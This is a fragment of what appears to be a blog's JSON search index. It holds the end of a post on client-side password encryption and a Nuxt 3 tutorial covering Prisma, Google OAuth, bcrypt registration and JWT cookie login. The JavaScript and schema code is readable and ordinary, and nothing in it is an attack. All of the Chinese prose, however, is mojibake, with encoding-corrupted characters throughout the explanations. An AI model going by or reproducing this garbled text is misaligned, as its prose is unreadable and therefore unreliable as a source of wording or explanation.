å¯†ï¼Œè€Œéåªæœ‰å¯†ç¢¼ï¼Œé€™å€‹åˆæ›´å®‰å…¨ä½†æ˜¯æˆæœ¬åˆæ›´é«˜ï¼Œè€Œä¸” debug å¾ˆä¸æ–¹ä¾¿ã€‚é›–ç„¶èªªæ—¢ç„¶åŠ å¯†åšåœ¨ client ç«¯ï¼Œæ”»æ“Šè€…ä¸€å®šæœ‰è¾¦æ³•é€†å‘é€™å€‹æ©Ÿåˆ¶ï¼Œçœ‹å‡ºæ˜¯æ€éº¼åšçš„ï¼Œä½†é€™ä¸ä»£è¡¨é€™äº›æ©Ÿåˆ¶æ²’å¹«åŠ©ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­æˆ‘æœ‰å€‹æ¶ç¥¨ App ä¸æƒ³è®“åˆ¥äººçŸ¥é“ API æ€éº¼å‘¼å«ï¼Œæ–¼æ˜¯å°±å¯¦ä½œäº†ä¸€å€‹è¶…è¤‡é›œçš„åŠ è§£å¯†æ©Ÿåˆ¶ï¼Œå„˜ç®¡é«˜æ‰‹é‚„æ˜¯å¯ä»¥åšé€†å‘å·¥ç¨‹ï¼Œå¯«å‡ºä¸€å€‹æ¶ç¥¨æ©Ÿå™¨äººï¼Œä½†é€™å€‹æ©Ÿåˆ¶å¢åŠ äº†ä»–çš„æ™‚é–“æˆæœ¬ä»¥åŠå°æŠ€è¡“çš„è¦æ±‚ã€‚\nä»¥æŠ€è¡“ä¸Šä¾†èªªï¼Œå°±ç®—ç†è«–ä¸Šä¸€å®šæœƒè¢«ç ´è§£ï¼Œé€™äº›æ©Ÿåˆ¶é‚„æ˜¯æœ‰æ„ç¾©çš„ï¼Œå®ƒçš„æ„ç¾©åœ¨æ–¼å¢åŠ ç ´è§£é›£åº¦ï¼ŒåŠ æ®¼ã€æ··æ·†éƒ½æ˜¯ä¸€æ¨£çš„ï¼Œä¸æœƒå› ç‚ºã€Œåœ¨ client ç«¯çš„æ±è¥¿ä¸€å®šæœƒè¢«çœ‹ç©¿ã€è€Œä¸å»åšé€™äº›æ©Ÿåˆ¶ã€‚\né‡é»åœ¨æ–¼ä½ æƒ³ä¿è­·çš„å•†æ¥­é‚è¼¯çš„åƒ¹å€¼ï¼Œæœ‰æ²’æœ‰é«˜åˆ°ä½ éœ€è¦ä»˜å‡ºé€™äº›æˆæœ¬å»åšé¡å¤–çš„å®‰å…¨æ©Ÿåˆ¶ã€‚\næœ€å¾Œï¼Œå¦‚æœä½ éœ€è¦ä¸€å€‹æ¢åˆ—å¼çš„ç°¡å–®çµè«–ï¼Œæœƒæ˜¯ï¼š\nç„¡è«–å¦‚ä½•ï¼Œä¸€å®šè¦å…ˆç”¨ HTTPS åœ¨å‰ç«¯å…ˆæŠŠå¯†ç¢¼åšåŠ å¯†æˆ–æ˜¯ hash å¾Œå†å‚³é€ï¼Œèƒ½å¤ å¢åŠ å®‰å…¨æ€§ï¼Œä½†åŒæ™‚ä¹Ÿå¸¶ä¾†ä¸å°‘æˆæœ¬ å¦‚æœä½ æ˜¯éŠ€è¡Œæˆ–éœ€è¦åŒç­‰å®‰å…¨æ€§ï¼Œå†ä¾†è€ƒæ…®è¦ä¸è¦åšé€™å€‹ï¼Œå¦å‰‡æ¥µå¤§å¤šæ•¸çš„ç‹€æ³ä¸‹ï¼Œä½ ä¸éœ€è¦é€™å€‹æ©Ÿåˆ¶å°±å¤ å®‰å…¨äº†ï¼Œè³‡æºæŠ•å…¥åœ¨å…¶ä»–åœ°æ–¹çš„æ•ˆç›Šæœƒæ›´å¤§ è‹¥æ˜¯å°é€™å€‹çµè«–æœ‰ä¸åŒæ„è¦‹ï¼Œæˆ–æ˜¯æœ‰åœ¨æ–‡ç« ä¸­ç™¼ç¾å“ªäº›é‚è¼¯éŒ¯èª¤æˆ–æŠ€è¡“éŒ¯èª¤ï¼Œæ­¡è¿ç•™è¨€æŒ‡æ­£èˆ‡è¨è«–ï¼Œæ„Ÿæ©ã€‚\nè£œå……ä¸€ä¸‹ï¼Œé€™ç¯‡å¤§å¤šæ•¸å¾æŠ€è¡“é¢ä¾†çœ‹ï¼Œé™¤æ­¤ä¹‹å¤–é‚„å¯ä»¥å¾æ³•éµé¢æˆ–æ˜¯è³‡å®‰çš„å¯¦å‹™ç¶“é©—ä¾†çœ‹ï¼Œä½†é€™äº›é¢å‘æˆ‘å°±é›¶ç¶“é©—äº†ã€‚è¨±é¡˜ä¸€ä¸‹æœ‰ç›¸é—œç¶“é©—çš„äººå‡ºä¾†æŒ‡é»è¿·æ´¥ï¼Œæˆ–è¨±æœƒæœ‰ä¸åŒè§€é»ã€‚\n","date":"2023-01-17T00:00:00Z","image":"https://live.staticflickr.com/65535/52634831533_259566b84f_o.jpg","permalink":"https://wayneblog.ga/2023-01-17/why-encrypt-in-client/","title":"ç¶²ç«™å‰ç«¯æ‰“ API æ™‚æŠŠå¯†ç¢¼åŠ å¯†ï¼Œæœ‰æ„ç¾©å—ï¼Ÿ"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå¤§å®¶ç¶“é ã€Nuxt3ã€‘é–‹ç®±å³ç”¨çš„ Nuxt3 ç©è½‰ç­†è¨˜ é€™ç¯‡æ–‡ç« ï¼Œæ‡‰è©²å°æ–¼ Nuxt 3 æœ‰åˆæ­¥çš„ç†è§£ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å°‡é€²å…¥å¯¦æˆ°éƒ¨åˆ†ï¼Œæˆ‘å°‡æœƒä»¥ Nuxt 3 ä¾†å¯¦ä½œéƒ¨è½æ ¼ç¶²ç«™ï¼Œè®“å·²ç¶“è¨»å†Šçš„ä½¿ç”¨è€…å¯ä»¥åœ¨ç¶²ç«™ä¸Šç™¼å¸ƒæ–‡ç« ï¼Œå¯¦ä½œé€™å€‹ç¶²ç«™çš„ç¨‹å¼ç¢¼å¯èƒ½ä¸æœƒè¬›è§£å¾—éå¸¸ä»”ç´°ï¼Œä½†ä¸€äº›å¯¦å‹™é–‹ç™¼ä¸Šæœƒéœ€è¦æ³¨æ„çš„ç´°ç¯€æˆ‘æœƒæŠŠå€‹äººç¶“é©—åšä¸€å€‹ç´€éŒ„ï¼Œå¤§å®¶å¯ä»¥å†åƒè€ƒçœ‹çœ‹ï¼Œæ–‡æœ«ä¹Ÿéƒ½æœƒé™„ä¸Šå®Œæ•´çš„ç¯„ä¾‹ç¨‹å¼ã€‚æ¥ä¸‹ä¾†ï¼Œè®“æˆ‘å€‘é–‹å§‹å§ï¼\nè³‡æ–™åº«èˆ‡æœƒå“¡ç³»çµ± è³‡æ–™åº« (Database) é€™ç¯‡æ–‡ç« å¯¦ä½œçš„éƒ¨è½æ ¼ï¼ŒæœƒæŠŠæœƒå“¡èˆ‡æ–‡ç« ç­‰è³‡æ–™å„²å­˜æ–¼ä¼ºæœå™¨çš„è³‡æ–™åº«ä¹‹ä¸­ï¼Œå¤§å®¶å¯ä»¥é¸æ“‡è‡ªå·±ç¿’æ…£æˆ–åˆé©çš„è³‡æ–™åº«ä¾†åšå„²å­˜ã€‚ç‚ºäº†æ–¹ä¾¿åŠå¾ŒçºŒçš„å±•ç¤ºï¼Œæˆ‘æœ€çµ‚æ±ºå®šä½¿ç”¨ Prisma æ­é…æœ¬åœ°çš„ SQLite ä¾†ç•¶ä½œå„²å­˜é«”ï¼Œè®“å¤§å®¶æ¸¬è©¦æ™‚ä¸ç”¨å†ç…©æƒ±æ€éº¼æ¶è¨­è³‡æ–™åº«ï¼Œå¯ä»¥å¿«é€Ÿçš„åŸ·è¡Œç¯„ä¾‹ç¨‹å¼ç¢¼ã€‚\nä½ å¯ä»¥åœ¨è‡ªå·±çš„ Nuxt å°ˆæ¡ˆæˆ–å¾æ–°å°ˆæ¡ˆé–‹å§‹é€²è¡Œï¼Œè‹¥ä½ å·²ç¶“æœ‰è‡ªå·±çš„è³‡æ–™åº«ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è·³éæ­¤æ®µä»‹ç´¹å¾ŒçºŒå¯¦ä½œè‡ªå·±çš„å¾Œç«¯ API ä¾†æ¥çºŒæˆ‘å€‘çš„å¯¦ä½œç³»åˆ—ã€‚\nå®‰è£ Prisma Prisma æ“ä½œèµ·ä¾†å¾ˆåƒ ORM (Object-Relational Mapping)ï¼Œä½†å¯¦éš›ä¸Šä¾æ“šå®˜ç¶²çš„èªªæ˜ï¼Œå…¶å¯¦ä¸å¤§ä¾æ¨£ï¼ŒPrisma é€éæ’°å¯«ä¸¦æ ¹æ“š Schema ä¾†å»ºç«‹æˆ–æ“ä½œè³‡æ–™åº«ï¼Œåœ¨é€²è¡Œ CRUD çš„æ“ä½œæ™‚ï¼Œéƒ½æ˜¯é€é Prisma Client é€²è¡Œï¼Œé€™ä¹Ÿæ˜¯æœ€æ–¹ä¾¿çš„åœ°æ–¹ï¼Œæ­¤å¤–ä¹Ÿæ”¯æ´å¤šç¨®è³‡æ–™åº«çš„ä¾†æºï¼Œåªè¦æ“ä½œ Model å°±å¯ä»¥æ˜ å°„åˆ°è³‡æ–™åº«çš„è³‡æ–™ï¼Œä¸å†éœ€è¦å¯« SQLï¼Œåœ¨ä¸€äº›æƒ…å¢ƒä¹‹ä¸‹æ˜¯éå¸¸æ–¹ä¾¿çš„ã€‚\né¦–å…ˆï¼Œä½¿ç”¨ NPM å®‰è£ prisma èˆ‡ @prisma/client\n1 2 3 npm install -D prisma @prisma/client # or # yarn add -D prisma @prisma/client æ‰“é–‹çµ‚ç«¯æ©Ÿ (Terminal) æ–¼ Nuxt å°ˆæ¡ˆç›®éŒ„ä¸­ï¼Œ ä½¿ç”¨ä¸‹åˆ—æŒ‡ä»¤ï¼Œåˆå§‹åŒ–ä¸€å€‹ Prisma çš„ Schemaã€‚\n1 npx prisma ini åˆå§‹åŒ–å®Œæˆå¾Œï¼Œæœƒå»ºç«‹ä¸€å€‹ schema.prisma æª”æ¡ˆã€‚\n./prisma/schema.prisma æª”æ¡ˆå…§å®¹å¦‚ä¸‹ï¼Œé€™è£¡å°±æ˜¯å®šç¾©æˆ‘å€‘è³‡æ–™åº«ä½ç½®èˆ‡ Schema çš„åœ°æ–¹ï¼Œä¹‹å¾Œæˆ‘å€‘å°±å¯ä»¥é€é Prisma çš„ Client ä½¿ç”¨ ORM ä¾†æ“ä½œè³‡æ–™åº«ã€‚\nprisma/schema.prisma 1 2 3 4 5 6 7 8 9 10 11 // This is your Prisma schema file, // learn more about it in the docs: https://pris.ly/d/prisma-schema generator client { provider = \u0026#34;prisma-client-js\u0026#34; } datasource db { provider = \u0026#34;postgresql\u0026#34; url = env(\u0026#34;DATABASE_URL\u0026#34;) } æˆ‘å€‘èª¿æ•´ ./prisma/schema.prisma æª”æ¡ˆå…§å®¹ï¼Œå°‡ datasource æ›¿æ›ç‚º SQLite ä¸¦å„²å­˜åœ¨æœ¬åœ°çš„ ./dev.dbã€‚\n1 2 3 4 datasource db { provider = \u0026#34;sqlite\u0026#34; url = \u0026#34;file:./dev.db\u0026#34; } ä½ ä¹Ÿå¯ä»¥å°‡ provider æ›¿æ›ç‚º PostgreSQL æˆ– MySQL ç­‰ï¼Œå¯ä»¥åƒè€ƒé€™è£¡ï¼Œä½†è¦æ³¨æ„å¯èƒ½å¾Œé¢å®šç¾©çš„ Schema èªæ³•æœƒç•¥å¾®ä¸åŒã€‚\næ¥ä¸‹ä¾†æˆ‘å€‘å®šç¾©ä¸€å€‹ User çš„è³‡æ–™è¡¨ï¼Œåœ¨ schema.prisma æ’°å¯«å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 model User { id String @id @default(uuid()) providerName String? providerUserId String? nickname String @default(\u0026#34;User\u0026#34;) email String @unique password String? avatar String? emailVerified Boolean @default(false) createdAt DateTime @default(now()) updatedAt DateTime @updatedAt } é€™å¼µ User è³‡æ–™è¡¨ï¼Œå°‡ç”¨ä½œæ–¼éƒ¨è½æ ¼çš„ç™»å…¥ä½¿ç”¨è€…åšä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥è¦–ç‚ºæ˜¯æœƒå“¡ç³»çµ±ä½¿ç”¨çš„è³‡æ–™è¡¨ï¼Œå¤§å®¶ä¹Ÿå¯ä»¥ä¾æ“šéœ€æ±‚ä¾†æ“´å¢æ¬„ä½ï¼Œä»¥ä¸‹ç¨å¾®è¬›è¿°ä¸€ä¸‹å„å€‹æ¬„ä½å°‡ä½œç‚ºä½•ç”¨ã€‚\nid: é è¨­ç‚º UUIDï¼Œç‚ºä½¿ç”¨è€…çš„å”¯ä¸€è­˜åˆ¥ã€‚ providerName: ä½œç‚ºç¬¬ä¸‰æ–¹ç™»å…¥çš„ä¾›æ‡‰å•†è¨˜éŒ„ä½¿ç”¨ï¼Œä¾‹å¦‚è©²åä½¿ç”¨è€…ä½¿ç”¨ Google OAuth è¨»å†Šç™»å…¥ï¼Œæˆ‘æœƒåœ¨æ¬„ä½å°±æœƒå¡«ä¸Š googleã€‚å¦‚æœç‚ºç©ºå€¼ (null) è¡¨ç¤ºä½¿ç”¨è€…ç”¨é›»å­ä¿¡ç®±è¨»å†Šç™»å…¥ã€‚ providerUserId: èˆ‡ providerName æ­é…ä½¿ç”¨ï¼Œç¬¬ä¸‰æ–¹ä¾›æ‡‰å•†é€šå¸¸ä¹Ÿæœƒæœ‰ä¸€çµ„å°ˆå±¬æ–¼ä½¿ç”¨è€…çš„ Idï¼Œä»¥æ­¤æˆ‘å€‘å°±å¯ä»¥ä¾†æ¯”å°ç™»å…¥çš„æ˜¯å“ªä½ä½¿ç”¨è€…ã€‚å¦‚æœç‚ºç©ºå€¼ (null) è¡¨ç¤ºä½¿ç”¨è€…ç”¨é›»å­ä¿¡ç®±è¨»å†Šç™»å…¥ã€‚ nickname: ä½¿ç”¨è€…æš±ç¨±ï¼Œé è¨­å€¼ç‚ºå­—ä¸² Userã€‚ email: ä½¿ç”¨è€…ç™»å…¥çš„é›»å­ä¿¡ç®±ï¼Œé€™è£¡æˆ‘å°‡æ¬„ä½è¨­å®šç‚º @unique è¡¨ç¤ºï¼Œé›»å­ä¿¡ç®±æ˜¯ç³»çµ±ä¸­å”¯ä¸€ã€‚ password:ä½¿ç”¨è€…å¯†ç¢¼çš„é›œæ¹Šå€¼ï¼Œå¦‚æœä½¿ç”¨ç¬¬ä¸‰æ–¹è¨»å†Šç™»å…¥ï¼Œå‰‡è©²æ¬„ä½ç‚º ç©ºå€¼ (null)ã€‚ avatar: ä½¿ç”¨è€…çš„é ­åƒï¼Œå­˜æ”¾åœ–ç‰‡ç¶²å€ã€‚ emailVerified: å¸ƒæ—å€¼ï¼Œé è¨­ç‚º falseï¼Œè¡¨ç¤ºä½¿ç”¨è€…çš„é›»å­ä¿¡ç®±æ˜¯å°šæœªé€šéé©—è­‰ã€‚ createdAt: ä½¿ç”¨è€…å»ºç«‹æ™‚é–“ï¼Œé è¨­ç‚ºæ’å…¥è©²ç­†è³‡æ–™çš„æ™‚é–“ã€‚ updatedAt: ä½¿ç”¨è€…æ›´æ–°å€‹äººè³‡æ–™çš„æ™‚é–“ï¼Œé è¨­ç‚ºæ›´æ–°è©²ç­†è³‡æ–™çš„æ™‚é–“ã€‚ ./prisma/schema.prisma æª”æ¡ˆå…§å®¹çœ‹èµ·ä¾†å¦‚ä¸‹ï¼š\nprisma/schema.prisma 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // This is your Prisma schema file, // learn more about it in the docs: https://pris.ly/d/prisma-schema generator client { provider = \u0026#34;prisma-client-js\u0026#34; } datasource db { provider = \u0026#34;sqlite\u0026#34; url = \u0026#34;file:./dev.db\u0026#34; } model User { id String @id @default(uuid()) providerName String? providerUserId String? nickname String @default(\u0026#34;User\u0026#34;) email String @unique password String? avatar String? emailVerified Boolean @default(false) createdAt DateTime @default(now()) updatedAt DateTime @updatedAt } ç•¶æˆ‘å€‘èª¿æ•´å¥½ schema å¾Œï¼Œå°±å¯ä»¥åŸ·è¡Œä¸‹åˆ—æŒ‡ä»¤ï¼Œä¾†åˆå§‹åŒ–è³‡æ–™åº«ï¼ŒPrisma æœƒä¾ç…§ schema.prism ä¾†å¹«æˆ‘å€‘å»ºç«‹å°æ‡‰çš„è³‡æ–™è¡¨ã€‚\n1 npx prisma db push åˆå§‹åŒ–å®Œç•¢å¾Œï¼Œä½ å¯ä»¥ç™»å…¥ä½ çš„è³‡æ–™åº«æŸ¥çœ‹æ˜¯å¦å»ºç«‹æˆåŠŸï¼Œä¹Ÿå¯ä½¿ç”¨ Prisma æä¾›çš„ Prisma Studio ä¾†å¿«é€Ÿçš„æª¢è¦–èˆ‡æ“ä½œè³‡æ–™åº«å…§çš„è³‡æ–™ã€‚Prisma Studio å·²ç¶“å…§å»ºåœ¨ prisma å¥—ä»¶ä¸­ï¼ŒåŸ·è¡Œä»¥ä¸‹æŒ‡ä»¤å¾Œï¼Œå°±æœƒå•Ÿå‹•ä¸€å€‹ Web æœå‹™ï¼Œå¦‚ http://localhost:5555ï¼Œæˆ‘å€‘å°±å¯ä»¥åœ¨ç¶²é ä¸­æŸ¥çœ‹è³‡æ–™åº«å…§çš„è³‡æ–™å›‰ï¼\n1 npx prisma studio å¯ä»¥åœ¨ Prisma Studio çœ‹åˆ°æˆ‘å€‘å»ºç«‹çš„ User è³‡æ–™è¡¨ï¼Œä¹Ÿå°‡æ˜¯æˆ‘å€‘ç¨å¾Œä½¿ç”¨ Prisma æ“ä½œ ORM æ‰€å°æ‡‰çš„ User Modelã€‚\næœ€å¾Œè¨˜å¾—åŸ·è¡Œä¸‹åˆ—æŒ‡ä»¤ä¾†ç”¢ç”Ÿ Prisma Clientï¼Œé€™æ¨£æˆ‘å€‘å°±å¯ä»¥åœ¨ Nuxt 3 ä¸­ä½¿ç”¨ Prisma Client æ“ä½œè³‡æ–™åº«å›‰ï¼\n1 npx prisma generate Nuxt 3 æ“ä½œ Prisma Client å»ºç«‹ä¸€å€‹ä½¿ç”¨è€…è‡³è³‡æ–™åº« æˆ‘å€‘æ¥ä¸‹ä¾†å°±èƒ½ä½¿ç”¨å¦‚ä¸‹ç¨‹å¼ç¢¼å»ºç«‹ Prisma Clientï¼Œå¾ŒçºŒå¯ä»¥ç”¨ä¾†ä¾†æ“ä½œ Modelï¼Œæ›´å¤šçš„ Prisma Client API å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ã€‚\n1 2 3 import { PrismaClient } from \u0026#39;@prisma/client\u0026#39; const prismaClient = new PrismaClient() æˆ‘å€‘å»ºç«‹ä¸€éš» Server APIï¼Œæ–°å¢ ./server/api/test-create-user.get.jsï¼Œç”¨ä¾†æ¸¬è©¦æ”¶åˆ°è«‹æ±‚å¾Œå»ºç«‹ä¸€å€‹æ¸¬è©¦ä½¿ç”¨è€…ï¼Œè©³ç´°çš„ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\nserver/api/test-create-user.get.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import { PrismaClient } from \u0026#39;@prisma/client\u0026#39; const prismaClient = new PrismaClient() export default defineEventHandler(() =\u0026gt; { const user = prismaClient.user.create({ data: { providerName: null, providerUserId: null, nickname: \u0026#39;Ryan\u0026#39;, email: \u0026#39;ryanchien8125@gmail.com\u0026#39;, password: \u0026#39;é€™è£¡è¦æ”¾å¯†ç¢¼çš„é›œæ¹Šå€¼\u0026#39;, avatar: \u0026#39;\u0026#39;, emailVerified: true } }) return user }) ç•¶æˆ‘å€‘é€å‡º /api/test-create-user å¾Œï¼Œå¾Œç«¯æœƒä½¿ç”¨ Prisma Client æ“ä½œ User Modelï¼Œæˆ‘å€‘å°±èƒ½ä½¿ç”¨ ORM ä¾†å»ºç«‹å‡ºä½¿ç”¨è€…çš„è³‡æ–™åº«è¨˜éŒ„ã€‚\nNuxt 3 ä½¿ç”¨è€…è¨»å†Šå¸³è™Ÿ æˆ‘å€‘å°‡ ã€Nuxt3ã€‘é–‹ç®±å³ç”¨çš„ Nuxt3 ç©è½‰ç­†è¨˜ é€™ç¯‡æ–‡ç« ï¼Œæ‰€ä¸²æ¥çš„ Google OAuth åŠ Cookie åšä¸€å€‹çµåˆï¼Œè®“ä½¿ç”¨è€…é€é Google Auth ç™»å…¥å¾Œå¯ä»¥è‡ªå‹•çš„è¨»å†Šå»ºç«‹ä½¿ç”¨è€…æˆ–ç™»å…¥ç”¢ç”Ÿ Access Tokenã€‚\n./server/api/auth/google.post.js ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\nserver/api/auth/google.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 import { OAuth2Client } from \u0026#39;google-auth-library\u0026#39; import jwt from \u0026#39;jsonwebtoken\u0026#39; import db from \u0026#39;@/server/db\u0026#39; const runtimeConfig = useRuntimeConfig() export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) const oauth2Client = new OAuth2Client() oauth2Client.setCredentials({ access_token: body.accessToken }) const userInfo = await oauth2Client .request({ url: \u0026#39;https://www.googleapis.com/oauth2/v3/userinfo\u0026#39; }) .then((response) =\u0026gt; response.data) .catch(() =\u0026gt; null) oauth2Client.revokeCredentials() if (!userInfo) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Invalid token\u0026#39; }) } let userRecord = await db.user.getUserByEmail({ email: userInfo.email }) if (userRecord) { if ( (userRecord.providerName === \u0026#39;google\u0026#39; \u0026amp;\u0026amp; userRecord.providerUserId === userInfo.sub) === false ) { throw createError({ statusCode: 400, statusMessage: \u0026#39;This email address does not apply to this login method\u0026#39; }) } } else { userRecord = await db.user.createUser({ providerName: \u0026#39;google\u0026#39;, providerUserId: userInfo.sub, nickname: userInfo.name, email: userInfo.email, password: null, avatar: userInfo.picture, emailVerified: userInfo.email_verified }) } const jwtTokenPayload = { id: userRecord.id } const maxAge = 60 * 60 * 24 * 7 const expires = Math.floor(Date.now() / 1000) + maxAge const jwtToken = jwt.sign( { exp: expires, data: jwtTokenPayload }, runtimeConfig.jwtSignSecret ) setCookie(event, \u0026#39;access_token\u0026#39;, jwtToken, { httpOnly: true, maxAge, expires: new Date(expires * 1000), secure: process.env.NODE_ENV === \u0026#39;production\u0026#39;, path: \u0026#39;/\u0026#39; }) return { id: userRecord.id, provider: { name: userRecord.providerName, userId: userRecord.providerUserId }, nickname: userRecord.nickname, avatar: userRecord.avatar, email: userRecord.email } }) ç¨‹å¼ç¢¼å…§å®¹ç¨å¾®æœ‰ä¸€é»å¤šï¼Œä½†è¬›è§£ä¸€ä¸‹æµæ•´èˆ‡æ¦‚å¿µï¼š\nç•¶å‰ç«¯ Google OAuth ç™»å…¥æˆåŠŸå¾Œï¼Œå°‡å›å‚³çš„ Google access_token å‚³é€è‡³é€™éš» APIï¼Œä¸¦ä½¿ç”¨ Google API å–å¾—ä½¿ç”¨è€…è³‡è¨Šã€‚ db.user.getUserByEmail é€™å€‹æ˜¯æˆ‘å°è£çš„æ–¹æ³•ï¼Œè£¡é¢å°æ‡‰è‘— Prisma çš„ ORM æ“ä½œï¼Œå¦‚æœä½ æƒ³ä¹Ÿå¯ä»¥åœ¨é€™é‚Šæ›¿æ›ä½ çš„è³‡æ–™åº«æ“ä½œé‚è¼¯ï¼Œä¸»è¦é€™å€‹æ–¹æ³•ï¼Œå°±æ˜¯ä¾ç…§ä½¿ç”¨è€…çš„ Email å›å‚³è³‡æ–™åº«å…§æ˜¯å¦å­˜åœ¨ä¸€ç­†ç¬¦åˆçš„ä½¿ç”¨è€…è¨˜éŒ„ã€‚ å¦‚æœå­˜åœ¨ï¼Œæˆ‘æœƒåˆ¤æ–· provider æ˜¯å¦ç¬¦åˆ Google çš„ä½¿ç”¨è€…è³‡è¨Šï¼Œå¦å‰‡åˆ¤æ–·ç‚ºæ‡‰è©²æ˜¯ç”¨é›»å­ä¿¡ç®±è¨»å†Šçš„ä½¿ç”¨è€…ã€‚ å¦‚æœä¸å­˜åœ¨ï¼Œå‰‡å»ºç«‹ä¸€å€‹æ–°çš„ä½¿ç”¨è€…è‡³è³‡æ–™åº«å…§ï¼Œå»ºç«‹æ™‚ä¸éœ€è¦å‚³å…¥ id è³‡æ–™åº«å› ç‚ºè¨­å®šç‚ºè‡ªå‹•ç”¢ç”Ÿ UUIDã€‚ æœ€å¾Œå°±æ˜¯ç”¢ç”Ÿä½¿ç”¨è€…çš„ JWT ä¸¦è¨­å®šåœ¨ cookie ä¹‹ä¸­ã€‚ å¦å¤–ï¼Œæˆ‘ä¹Ÿå¯¦ä½œäº†ä½¿ç”¨é›»å­ä¿¡ç®±ç›´æ¥è¨»å†Šçš„æ–¹å¼ï¼Œ./server/api/auth/register.post.js ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\nserver/api/auth/register.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import bcrypt from \u0026#39;bcrypt\u0026#39; import db from \u0026#39;@/server/db\u0026#39; export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) let userRecord = await db.user.getUserByEmail({ email: body.email }) if (userRecord) { throw createError({ statusCode: 400, statusMessage: \u0026#39;A user with that email address already exists\u0026#39; }) } userRecord = await db.user.createUser({ providerName: null, providerUserId: null, nickname: body.nickname, email: body.email, password: bcrypt.hashSync(body.password, 10), avatar: null, emailVerified: false }) return { id: userRecord.id, nickname: userRecord.nickname, email: userRecord.email } }) ä½¿ç”¨é›»å­ä¿¡ç®±èˆ‡å¯†ç¢¼è¨»å†Šçš„æµç¨‹å¾ˆç°¡å–®ï¼Œå°±æ˜¯åˆ¤æ–·æ˜¯å¦å­˜åœ¨ç›¸åŒä¿¡ç®±çš„ä½¿ç”¨è€…ï¼Œä¸å­˜åœ¨çš„è©±å°±ç‚ºå®ƒå»ºç«‹ä¸€ç­†ç´€éŒ„ã€‚\né€™é‚Šè¦æ³¨æ„çš„æ˜¯ï¼Œæœƒå“¡ç³»çµ±æˆ–ç‰½æ‰¯åˆ°å¸³è™Ÿå¯†ç¢¼ç›¸é—œçš„ï¼Œè«‹ä¸€å¾‹ä½¿ç”¨é›œæ¹Šæ¼”ç®—æ³•ï¼Œä¾‹å¦‚ BCrypt æˆ– Argon2ï¼Œç‚ºä½¿ç”¨è€…çš„å¯†ç¢¼åš Hashï¼Œä¸è¦å†å­˜æ˜ç¢¼åœ¨è³‡æ–™åº«ä¹‹ä¸­å›‰ï¼Œä»¥å…ç™¼ç”Ÿè³‡å®‰äº‹ä»¶æ™‚ï¼Œé€ æˆä¸å¯æŒ½å›çš„æ‚²åŠ‡ã€‚\né †ä¾¿ä¹Ÿå¯¦ä½œä¸€ä¸‹ä½¿ç”¨é›»å­ä¿¡ç®±èˆ‡å¯†ç¢¼ç™»å…¥çš„ APIï¼Œ./server/api/auth/login.post.js ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\nserver/api/auth/login.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 import bcrypt from \u0026#39;bcrypt\u0026#39; import jwt from \u0026#39;jsonwebtoken\u0026#39; import db from \u0026#39;@/server/db\u0026#39; const runtimeConfig = useRuntimeConfig() export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) const userRecord = await db.user.getUserByEmail({ email: body.email }) if (!userRecord) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Email or password is incorrect\u0026#39; }) } if ((await bcrypt.compare(body.password, userRecord.password)) !== true) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Email or password is incorrect\u0026#39; }) } const jwtTokenPayload = { id: userRecord.id } const maxAge = 60 * 60 * 24 * 7 const expires = Math.floor(Date.now() / 1000) + maxAge const jwtToken = jwt.sign( { exp: expires, data: jwtTokenPayload }, runtimeConfig.jwtSignSecret ) setCookie(event, \u0026#39;access_token\u0026#39;, jwtToken, { httpOnly: true, maxAge, expires: new Date(expires * 1000), secure: process.env.NODE_ENV === \u0026#39;production\u0026#39;, path: \u0026#39;/\u0026#39; }) return { id: userRecord.id, provider: { name: userRecord.providerName, userId: userRecord.providerUserId }, nickname: userRecord.nickname, avatar: userRecord.avatar, email: userRecord.email } }) ä½¿ç”¨ Google OAuth ç™»å…¥ ä½¿ç”¨é›»å­ä¿¡ç®±èˆ‡å¯†ç¢¼ç™»å…¥ çµåˆ Pinia å„²å­˜ä½¿ç”¨è€…è³‡æ–™ æˆ‘å€‘å¯ä»¥çµåˆ Pinia ä¾†å°‡ä½¿ç”¨è€…çš„è³‡æ–™æŒä¹…è©±å„²å­˜åœ¨ Local Storage ä¹‹ä¸­ï¼Œé€™æ¨£å°±å¯ä»¥åœ¨å‰ç«¯å„²å­˜ä½¿ç”¨è€…ç™»å…¥çš„ç‹€æ…‹ï¼Œä¾‹å¦‚å°è¦½åˆ—çš„é ­åƒã€ä¿¡ç®±ï¼Œå°±å¯ä»¥å¾ Store ä¸­æ‹¿å‡ºä¾†å›‰ã€‚\nå»ºç«‹ ./server/profile.get.js æª”æ¡ˆï¼Œç”¨ä¾†å–å¾—ä½¿ç”¨è€…è³‡æ–™ï¼š\nserver/profile.get.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 